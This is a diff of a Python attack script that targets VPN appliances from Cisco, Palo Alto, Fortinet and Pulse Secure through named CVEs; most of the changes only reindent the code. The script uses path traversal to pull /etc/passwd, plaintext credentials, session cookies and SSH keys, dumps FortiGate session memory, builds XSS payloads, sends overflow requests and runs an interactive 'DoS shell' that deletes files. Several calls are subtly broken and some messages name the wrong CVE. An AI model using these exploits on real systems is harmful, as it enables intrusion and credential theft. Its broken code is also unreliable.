@@ -45,7 +45,6 @@ parser.add_argument('-e', help='exploit 0day vulnerability', dest='cve', default
 
 args = parser.parse_args()
 
-
 port = args.port
 try:
     if len(str(port)):
@@ -61,8 +60,6 @@ host = args.host
 if not len(host) and lst == False:
     print('No host to pwn.')
     quit()
-
-    
     
 def printable_char(s):
 	return all((ord(c) < 127) and (ord(c) >= 32) for c in s)
@@ -72,8 +69,6 @@ def printable(b):
         return byte
     else:
         return '.'
-    
-    
 
 def cve_2020_3187(host, port):
     url = "https://%s%s/+CSCOE+/session_password.html" % (host, port)
@@ -82,26 +77,25 @@ def cve_2020_3187(host, port):
     if r.status_code != 200:
         print('The host %s is not vulnerable to CVE-2020-3187' % host)
     else:
-	print('Pwned the DoS shell of %s' % host)
-	print('')
-	print('DoS shell CVE-2020-3187')
-	print('(!) Enter files you want to DoS to delete')
-	while 1:
-	    data = input('dos> ')
-	    if data.replace(' ', '') in ['exit', 'quit']:
-		break
-	    if data[0] != '/':
-		data = '/'+data
-	    turl = 'https://%s%s%s' % (host, port, data)
-	    tr = request.get(turl, verify=False)
-	    if tr.status_code == 404:
-		print('File does not exist')
-		continue
-	    COOKIE = {'token' : '..%s' % data}
-	    r = request.get(url, verify=False, cookie=COOKIE)
-	    print('Deleted %s' % data)
-	
-	
+        print('Pwned the DoS shell of %s' % host)
+        print('')
+        print('DoS shell CVE-2020-3187')
+        print('(!) Enter files you want to DoS to delete')
+        while 1:
+            data = input('dos> ')
+            if data.replace(' ', '') in ['exit', 'quit']:
+                break
+            if data[0] != '/':
+                data = '/'+data
+            turl = 'https://%s%s%s' % (host, port, data)
+            tr = request.get(turl, verify=False)
+            if tr.status_code == 404:
+                print('File does not exist')
+                continue
+            COOKIE = {'token' : '..%s' % data}
+            r = request.get(url, verify=False, cookie=COOKIE)
+            print('Deleted %s' % data)
+
 def cve_2019_1579(host, port):
     sign = '<msg>Invalid parameters</msg>'
     
@@ -153,9 +147,7 @@ def cve_2019_1579(host, port):
         data = "scep-profile-name=%s" % buff
         r = requests.post(url, data=data, verify=False).text.replace('\n', '')
         print(r + crlf)
-        
-        
-        
+
 def cve_2018_13380(host, port):
     url1 = 'https://%s%s/remote/error?errmsg=ABABAB--\%3E\%3Cscript\%3Ealert(1)\%3C/script\%3E' % (host, port)
     url2 = 'https://%s%s/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29' % (host, port)
@@ -165,9 +157,7 @@ def cve_2018_13380(host, port):
     print(' - %s' % red + url1)
     print(' - %s' % red + url2)
     print(' - %s' % red + url3)
-    
 
-    
 def cve_2018_13379(host, port):
     url = 'https://%s%s/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession' % (host, port)
     r = requests.get(url, verify=False, stream=True, timeout=3)
@@ -177,13 +167,13 @@ def cve_2018_13379(host, port):
         memory_addr = 0
         rb = b''
         _str = ''        
-    	while True:
+        while True:
        	    chunk = img.read(8192)
             if chunk:
                 for b in chunk:
                     rb += b     			
             else:
-          	break
+                break
                 
         print('Dumped the memory buffer of %s:' % host)               
         for byte in rb:
@@ -197,9 +187,7 @@ def cve_2018_13379(host, port):
          
     else:
         print('The host %s is not vulnerable to CVE-2018-13379' % host)
-        
 
-	
 def cve_2018_13381(host, port):
     data = {
 	   'title': 'x', 
@@ -207,67 +195,51 @@ def cve_2018_13381(host, port):
     }
     r = requests.post('https://%s%s/message' % (host, port), data=data)
     print('Heaped overflow the host %s' % host)
-	
-	
-	
+
 def cve_2019_11507(host, port):
     url = 'https://%s%s/dana/home/cts_get_ica.cgi?bm_id=x&vdi=1&appname=aa\%0d\%0aContent-Type::text/html\%0d\%0aContent-Disposition::inline\%0d\%0aaa:bb<svg/onload=alert(document.domain)>' % (host, port)
     print('Got the XSS payload for %s:' % host)
     print(' - %s' % red + url)
-	
-	
 	
 def cve_2019_11510(host, port):
     url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/' % (host, port)
     r = requests.get(url, verify=False).text
 	
     if 'root' in r:
-	print('Extracted the server database from %s' % host)
-	print('')
+        print('Extracted the server database from %s' % host)
+        print('')
+
+        url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/' % (host, port)
+        r = requests.get(url, verify=False).text
 	
-	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/' % (host, port)
-	r = requests.get(url, verify=False).text
+        if len(r) > 5:
+            print('Plaintext usernames and password:')
+            for l in r.split('\n'):
+                print(' - ' + l)
+        else:
+            print('Plaintext usernames and password: Not found')
 	
-	if len(r) > 5:
-	    print('Plaintext usernames and password:')
-	    for l in r.split('\n'):
-		print(' - ' + l)
-	else:
-	    print('Plaintext usernames and password: Not found')
+        url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/' % (host, port)
+        r = requests.get(url, verify=False).text.replace('\n', '')
 	
-	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/' % (host, port)
-	r = requests.get(url, verify=False).text.replace('\n', '')
-	
-	print('Session cookies (sessionids): DSID=%s' % r)
-	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../.ssh/authorized_keys?/dana/html5acc/guacamole/' % (host, port)
+        print('Session cookies (sessionids): DSID=%s' % r)
+        url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../.ssh/authorized_keys?/dana/html5acc/guacamole/' % (host, port)
         
-	ssh = requests.get(url, verify=False).text
+        ssh = requests.get(url, verify=False).text
 	
-	if len(ssh) > 50:
-	    print('  SSH PRIVATE RSA KEYS')
-    	    print('')
-    	    print(' - - - - - - - - - - - - - - - ')
-	    print(ssh)
-	    print(' - - - - - - - - - - - - - - - ')
-	else:
-	    print(print('  SSH PRIVATE RSA KEYS')
-    	    print('')
-    	    print(' - - - - - - - - - - - - - - - ')
-            print(' Not found')
-            print(' - - - - - - - - - - - - - - - ')
+        if len(ssh) > 50:
+            print('SSH authorized_keys: %s' % ssh)
+        else:
+            print('SSH authorized_keys not found')
 	
     else:
-	print('The host %s is not vulnerable to CVE-2018-13379' % host)
-		  
+        print('The host %s is not vulnerable to CVE-2018-13379' % host)
 
-		  
 def cve_2019_11542(host, port):
     url = 'https://%s%s/dana-admin/auth/hc.cgi?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&policyid=0' % (host, port)
     r = requests.get(url, verify=False)
-    print('Stack buffer overflowed the host %s' % host)
-		  
-		  
-		  
+    print('Stack buffer overflowed the host %s' % host)	  
+  
 def cve_2019_11540(host, port):
     payload = '''<script src="https://%s%s/dana/cs/cs.cgi?action=appletobj"></script>
 <script>
@@ -284,9 +256,7 @@ def cve_2019_11540(host, port):
     print('  - - - - - - - - - -%s' % red)
     print(payload)
     print('%s  - - - - - - - - - -' % white)
-	
-	
-	
+
 def scan(host):
     found = False
     for sub in vpnsub:
@@ -321,6 +291,3 @@ else:
     exec('%s(host, port)' % cve.lower().replace('-', '_'))
 
 print('')
-    
-    
-
